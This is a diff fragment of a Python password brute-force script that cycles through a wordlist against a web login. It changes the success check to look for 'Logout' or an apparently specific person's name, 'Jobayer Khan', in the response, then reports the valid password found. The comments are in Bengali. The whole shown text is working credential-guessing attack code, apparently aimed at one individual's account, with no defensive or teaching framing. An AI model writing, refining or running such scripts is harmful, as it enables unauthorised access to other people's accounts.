@@ -37,8 +37,8 @@ with open(wordlist) as f:
                 for r in resp.history:
                     print("  ▶ Redirect:", r.status_code, r.headers.get("Location"))
 
-            # চেক: url, status, বা session cookie
-            if resp.url.endswith("/job") or "session" in session.cookies.get_dict():
+            # ✅ সফল লগইন চেক
+            if "Logout" in resp.text or "Jobayer Khan" in resp.text:
                 print(f"[✅] Valid password found: {pwd}")
                 break
             else:
